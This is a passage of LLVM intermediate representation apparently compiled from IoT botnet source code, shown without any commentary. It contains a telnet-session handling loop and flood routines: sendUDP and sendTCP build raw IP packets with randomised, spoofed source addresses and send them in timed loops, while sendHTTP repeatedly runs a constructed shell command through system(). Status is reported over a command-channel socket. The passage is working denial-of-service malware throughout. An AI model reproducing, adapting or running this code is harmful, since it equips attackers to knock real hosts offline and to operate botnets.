  %1228 = load i32, i32* %2, align 4
  %1229 = sext i32 %1228 to i64
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1229
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1230, i32 0, i32 0
  %1232 = load i32, i32* %1231, align 16
  %1233 = call i32 @sclose(i32 %1232)
  %1234 = load i32, i32* %2, align 4
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1235
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1236, i32 0, i32 2
  store i8 0, i8* %1237, align 8
  %1238 = load i32, i32* %2, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 8
  %1242 = load i8*, i8** %1241, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1242, i8 0, i64 1024, i1 false)
  %1243 = load i32, i32* %2, align 4
  %1244 = sext i32 %1243 to i64
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1244
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1245, i32 0, i32 3
  store i8 1, i8* %1246, align 1
  br label %1285

1247:                                             ; preds = %1182
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 8
  %1252 = load i8*, i8** %1251, align 8
  %1253 = call i64 @strlen(i8* %1252) #11
  %1254 = trunc i64 %1253 to i16
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 7
  store i16 %1254, i16* %1258, align 16
  br label %1259

1259:                                             ; preds = %1247
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 6
  %1264 = load i32, i32* %1263, align 4
  %1265 = add i32 %1264, 30
  %1266 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1267 = icmp ult i32 %1265, %1266
  br i1 %1267, label %1268, label %1283

1268:                                             ; preds = %1259
  %1269 = load i32, i32* %2, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1270
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1271, i32 0, i32 0
  %1273 = load i32, i32* %1272, align 16
  %1274 = call i32 @sclose(i32 %1273)
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 2
  store i8 0, i8* %1278, align 8
  %1279 = load i32, i32* %2, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 3
  store i8 1, i8* %1282, align 1
  br label %1283

1283:                                             ; preds = %1268, %1259
  br label %1284

1284:                                             ; preds = %66, %1283, %1164, %1136, %1108, %1084, %948, %920, %892, %868, %720, %656, %528, %464, %377, %215
  br label %1285

1285:                                             ; preds = %1284, %1201, %1149, %1121, %1093, %1028, %933, %905, %877, %826, %801, %773, %705, %682, %605, %591, %513, %490, %410, %302, %168, %138
  %1286 = load i32, i32* %2, align 4
  %1287 = add nsw i32 %1286, 1
  store i32 %1287, i32* %2, align 4
  br label %62, !llvm.loop !42

1288:                                             ; preds = %62
  br label %60
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendUDP(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i64, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %8, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %6
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %6
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #15
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %270

47:                                               ; preds = %41
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = load i32, i32* %12, align 4
  store i32 %50, i32* %14, align 4
  %51 = load i32, i32* %10, align 4
  %52 = icmp eq i32 %51, 32
  br i1 %52, label %53, label %105

53:                                               ; preds = %47
  %54 = call i32 @socket(i32 2, i32 2, i32 17) #12
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %60, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* @mainCommSock, align 4
  %59 = call i32 (i32, i8*, ...) @sockprintf(i32 %58, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %270

60:                                               ; preds = %53
  %61 = load i32, i32* %11, align 4
  %62 = add nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = call noalias align 16 i8* @malloc(i64 %63) #12
  store i8* %64, i8** %16, align 8
  %65 = load i8*, i8** %16, align 8
  %66 = icmp eq i8* %65, null
  br i1 %66, label %67, label %68

67:                                               ; preds = %60
  br label %270

68:                                               ; preds = %60
  %69 = load i8*, i8** %16, align 8
  %70 = load i32, i32* %11, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %69, i8 0, i64 %72, i1 false)
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %73, i32 %74)
  %75 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %75, %76
  store i32 %77, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %78

78:                                               ; preds = %68, %100, %101
  %79 = load i32, i32* %15, align 4
  %80 = load i8*, i8** %16, align 8
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %84 = call i64 @sendto(i32 %79, i8* %80, i64 %82, i32 0, %struct.sockaddr* %83, i32 16)
  %85 = load i32, i32* %18, align 4
  %86 = load i32, i32* %14, align 4
  %87 = icmp eq i32 %85, %86
  br i1 %87, label %88, label %101

88:                                               ; preds = %78
  %89 = load i32, i32* %8, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %95

91:                                               ; preds = %88
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %93, i16* %94, align 2
  br label %95

95:                                               ; preds = %91, %88
  %96 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %97 = load i32, i32* %17, align 4
  %98 = icmp sgt i32 %96, %97
  br i1 %98, label %99, label %100

99:                                               ; preds = %95
  br label %104

100:                                              ; preds = %95
  store i32 0, i32* %18, align 4
  br label %78

101:                                              ; preds = %78
  %102 = load i32, i32* %18, align 4
  %103 = add i32 %102, 1
  store i32 %103, i32* %18, align 4
  br label %78

104:                                              ; preds = %99
  br label %270

105:                                              ; preds = %47
  %106 = call i32 @socket(i32 2, i32 3, i32 17) #12
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %112, label %109

109:                                              ; preds = %105
  %110 = load i32, i32* @mainCommSock, align 4
  %111 = call i32 (i32, i8*, ...) @sockprintf(i32 %110, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %270

112:                                              ; preds = %105
  store i32 1, i32* %20, align 4
  %113 = load i32, i32* %19, align 4
  %114 = bitcast i32* %20 to i8*
  %115 = call i32 @setsockopt(i32 %113, i32 0, i32 3, i8* %114, i32 4) #12
  %116 = icmp slt i32 %115, 0
  br i1 %116, label %117, label %120

117:                                              ; preds = %112
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i64 0, i64 0))
  br label %270

120:                                              ; preds = %112
  store i32 50, i32* %21, align 4
  br label %121

121:                                              ; preds = %125, %120
  %122 = load i32, i32* %21, align 4
  %123 = add nsw i32 %122, -1
  store i32 %123, i32* %21, align 4
  %124 = icmp ne i32 %122, 0
  br i1 %124, label %125, label %130

125:                                              ; preds = %121
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %127 = call i32 @rand_cmwc()
  %128 = xor i32 %126, %127
  call void @srand(i32 %128) #12
  %129 = call i32 @rand() #12
  call void @init_rand(i32 %129)
  br label %121, !llvm.loop !43

130:                                              ; preds = %121
  %131 = load i32, i32* %10, align 4
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %134

133:                                              ; preds = %130
  store i32 0, i32* %22, align 4
  br label %140

134:                                              ; preds = %130
  %135 = load i32, i32* %10, align 4
  %136 = sub nsw i32 32, %135
  %137 = shl i32 1, %136
  %138 = sub nsw i32 %137, 1
  %139 = xor i32 %138, -1
  store i32 %139, i32* %22, align 4
  br label %140

140:                                              ; preds = %134, %133
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 28, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %23, align 8
  %145 = alloca i8, i64 %143, align 16
  store i64 %143, i64* %24, align 8
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %25, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.udphdr*
  store %struct.udphdr* %150, %struct.udphdr** %26, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %22, align 4
  %156 = call i32 @getRandomIP(i32 %155)
  %157 = call i32 @htonl(i32 %156) #15
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 8, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* %151, i32 %154, i32 %157, i8 zeroext 17, i32 %161)
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 8, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #15
  %167 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.1* %168 to %struct.anon.3*
  %170 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %169, i32 0, i32 2
  store i16 %166, i16* %170, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon.1* %174 to %struct.anon.3*
  %176 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %175, i32 0, i32 0
  store i16 %172, i16* %176, align 2
  %177 = load i32, i32* %8, align 4
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %181

179:                                              ; preds = %140
  %180 = call i32 @rand_cmwc()
  br label %186

181:                                              ; preds = %140
  %182 = load i32, i32* %8, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #15
  %185 = zext i16 %184 to i32
  br label %186

186:                                              ; preds = %181, %179
  %187 = phi i32 [ %180, %179 ], [ %185, %181 ]
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.1* %190 to %struct.anon.3*
  %192 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %191, i32 0, i32 1
  store i16 %188, i16* %192, align 2
  %193 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon.1* %194 to %struct.anon.3*
  %196 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %195, i32 0, i32 3
  store i16 0, i16* %196, align 2
  %197 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %198 = bitcast %struct.udphdr* %197 to i8*
  %199 = getelementptr inbounds i8, i8* %198, i64 8
  %200 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %199, i32 %200)
  %201 = bitcast i8* %145 to i16*
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 2
  %204 = load i16, i16* %203, align 2
  %205 = zext i16 %204 to i32
  %206 = call zeroext i16 @csum(i16* %201, i32 %205)
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 7
  store i16 %206, i16* %208, align 2
  %209 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %210 = load i32, i32* %9, align 4
  %211 = add nsw i32 %209, %210
  store i32 %211, i32* %27, align 4
  store i32 0, i32* %28, align 4
  br label %212

212:                                              ; preds = %265, %264, %186
  br label %213

213:                                              ; preds = %212
  %214 = load i32, i32* %19, align 4
  %215 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %216 = call i64 @sendto(i32 %214, i8* %145, i64 %143, i32 0, %struct.sockaddr* %215, i32 16)
  %217 = call i32 @rand_cmwc()
  %218 = trunc i32 %217 to i16
  %219 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 0
  %221 = bitcast %union.anon.1* %220 to %struct.anon.3*
  %222 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %221, i32 0, i32 0
  store i16 %218, i16* %222, align 2
  %223 = load i32, i32* %8, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %227

225:                                              ; preds = %213
  %226 = call i32 @rand_cmwc()
  br label %232

227:                                              ; preds = %213
  %228 = load i32, i32* %8, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 zeroext %229) #15
  %231 = zext i16 %230 to i32
  br label %232

232:                                              ; preds = %227, %225
  %233 = phi i32 [ %226, %225 ], [ %231, %227 ]
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.1* %236 to %struct.anon.3*
  %238 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %237, i32 0, i32 1
  store i16 %234, i16* %238, align 2
  %239 = call i32 @rand_cmwc()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 3
  store i16 %240, i16* %242, align 4
  %243 = load i32, i32* %22, align 4
  %244 = call i32 @getRandomIP(i32 %243)
  %245 = call i32 @htonl(i32 %244) #15
  %246 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 8
  store i32 %245, i32* %247, align 4
  %248 = bitcast i8* %145 to i16*
  %249 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 2
  %251 = load i16, i16* %250, align 2
  %252 = zext i16 %251 to i32
  %253 = call zeroext i16 @csum(i16* %248, i32 %252)
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 7
  store i16 %253, i16* %255, align 2
  %256 = load i32, i32* %28, align 4
  %257 = load i32, i32* %14, align 4
  %258 = icmp eq i32 %256, %257
  br i1 %258, label %259, label %265

259:                                              ; preds = %232
  %260 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %261 = load i32, i32* %27, align 4
  %262 = icmp sgt i32 %260, %261
  br i1 %262, label %263, label %264

263:                                              ; preds = %259
  br label %268

264:                                              ; preds = %259
  store i32 0, i32* %28, align 4
  br label %212

265:                                              ; preds = %232
  %266 = load i32, i32* %28, align 4
  %267 = add i32 %266, 1
  store i32 %267, i32* %28, align 4
  br label %212

268:                                              ; preds = %263
  %269 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %269)
  br label %270

270:                                              ; preds = %46, %57, %67, %109, %117, %268, %104
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #8

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHTTP(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i64 0, i64 0)) #12
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #12
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i64 0, i64 0)) #12
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %19 = call noalias %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

20:                                               ; preds = %24, %2
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  br i1 %23, label %24, label %27

24:                                               ; preds = %20
  %25 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %26 = call i32 @system(i8* %25)
  br label %20, !llvm.loop !44

27:                                               ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare noalias %struct._IO_FILE* @popen(i8*, i8*) #5

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendTCP(i8* %0, i32 %1, i32 %2, i32 %3, i8* %4, i32 %5, i32 %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %340

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i64 0, i64 0))
  br label %340

55:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #12
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i64 0, i64 0))
  br label %340

63:                                               ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

73:                                               ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  store i64 %76, i64* %21, align 8
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %22, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %23, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #15
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
